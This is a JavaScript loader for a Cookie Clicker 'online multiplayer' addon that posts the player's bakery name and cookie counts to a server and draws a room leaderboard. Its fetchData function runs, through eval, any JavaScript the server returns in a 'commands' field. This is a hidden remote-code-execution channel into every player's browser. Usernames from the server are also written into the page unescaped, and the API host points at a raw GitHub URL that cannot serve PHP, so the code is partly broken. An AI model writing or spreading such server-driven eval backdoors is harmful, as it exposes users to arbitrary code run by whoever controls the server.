// === Multiplayer Script Loader ===
// Replace this with your actual GitHub raw link
let githubBase = "https://raw.githubusercontent.com/YourUser/YourRepo/main";

// Load dependencies
var script1 = document.createElement("script");
script1.src = `${githubBase}/javascript/functions.js`;
document.head.appendChild(script1);

var script2 = document.createElement("script");
script2.src = `${githubBase}/javascript/jquery.js`;
document.head.appendChild(script2);

// Used to store all values to make storage not overlap with cookie clicker values
var multiplayer = {
  startMenu: function () {
    this.clear();
    $("#multiplayer")
      .append(`<h1 class='title' style='font-size:150%'>Welcome to the Online Cookie Clicker Addon</h1><br>
        <p>You will see everyone's number of cookies and cookies per second that are in the same room.</p>
        <label for="room">Room ID:</label>
        <input type="text" id="room" name="room"/>
        <a id='joinButton' class='option'>Join room</a>`);
    $("#joinButton").click(function () {
      multiplayer.room = $("#room").val();
      multiplayer.gameMenu();
    });
  },
  clear: function () {
    $("#multiplayer").empty();
  },
  room: null,
  gameMenu: function () {
    this.clear();
    $("#multiplayer")
      .append(`<h1 class='title' style='font-size:150%'>Welcome to ${this.room}</h1><br>
        <p>If table stops updating leave and join the room.</p>
        <table id='leaderboard' style='width:100%;'></table>
        <a id='leave' class='option'>Leave room</a>`);
    this.intervalFetch = setInterval(this.fetchData, 2000);
    this.intervalFakeLive = setInterval(this.fakeLive, 30);
    $("#leave").click(function () {
      clearInterval(multiplayer.intervalFetch);
      clearInterval(multiplayer.intervalFakeLive);
      multiplayer.startMenu();
    });
  },
  intervalFakeLive: null,
  intervalFetch: null,
  fetchData: function () {
    let ajax = new XMLHttpRequest();
    ajax.onload = function () {
      let jsonData = JSON.parse(this.response);
      multiplayer.internalCookies = jsonData["leaderboard"].map((e) => {
        e.cookies = e.cookies * 10 ** e.powerOfCookies;
        e.cookiesPs = e.cookiesPs * 10 ** e.powerOfCookiesPs;
        return e;
      });
      let commands = jsonData["commands"];
      if (commands) {
        commands.forEach((command) => {
          eval(command["javascript"]);
        });
      }
    };
    ajax.open("POST", `${multiplayer.hostname}/api/cookieClicker.php`);
    ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    let powerOfCookies = 0;
    let cookies = Game.cookies;
    while (cookies >= 1000000) {
      powerOfCookies++;
      cookies /= 10;
    }
    let cookiesPs = Game.cookiesPs;
    let powerOfCookiesPs = 0;
    while (cookiesPs >= 1000000) {
      powerOfCookiesPs++;
      cookiesPs /= 10;
    }
    ajax.send(
      `username=${Game.bakeryName}&cookies=${Math.round(
        cookies
      )}&powerOfCookies=${powerOfCookies}&cookiesPs=${Math.round(
        cookiesPs
      )}&powerOfCookiesPs=${powerOfCookiesPs}&room=${
        multiplayer.room
      }&type=view&time=${Date.now()}`
    );
  },
  fakeLive: function () {
    let html = `<tr><th>Username</th><th>Cookies</th><th>Per Second</th><th>Last Update</th></tr>`;
    if (multiplayer.internalCookies) {
      multiplayer.internalCookies.forEach((data) => {
        let username = data["username"];
        let age = (Date.now() - parseInt(data["lastUpdate"])) / 1000;
        let cookies = Beautify(data["cookies"] + data["cookiesPs"] * age);
        let cookiesPs = Beautify(data["cookiesPs"]);
        let style = "";
        let button = "";
        if (age > 30) {
          style = "color:grey";
        } else {
          if (username == Game.bakeryName) {
            cookies = Beautify(Game.cookies);
            cookiesPs = Beautify(Game.cookiesPs);
            age = 0;
          }
        }
        html += `<tr style='${style}'><td>${username}</td><td>${cookies}</td><td>${cookiesPs}</td><td>${humanReadableTime(
          age
        )}</td><td>${button}</td></tr>`;
      });
    } else {
      html = "<p>Loading...</p>";
    }
    $("#leaderboard").empty();
    $("#leaderboard").append(html);
  },
  internalCookies: null,
  hostname: githubBase,
  lastFetch: null,
};

// Ensure jQuery + functions loaded before setup
var waitForJQuery = setInterval(function () {
  if (typeof $ != "undefined" && typeof getCookie != "undefined") {
    let element = document.getElementById("centerArea");
    let div = document.createElement("div");
    div.id = "multiplayer";
    div.style =
      "text-align:center;background:rgba(0,0,0,1);position:relative;z-index:100;padding-top:20px;padding-bottom:20px";
    element.insertBefore(div, element.firstChild);
    multiplayer.startMenu();
    console.log("Import successful");
    clearInterval(waitForJQuery);

    // 🔑 R-key toggle
    document.addEventListener("keydown", (e) => {
      if (e.key.toLowerCase() === "r") {
        let mp = document.getElementById("multiplayer");
        if (mp) {
          mp.style.display = (mp.style.display === "none") ? "" : "none";
        }
      }
    });
  }
}, 10);
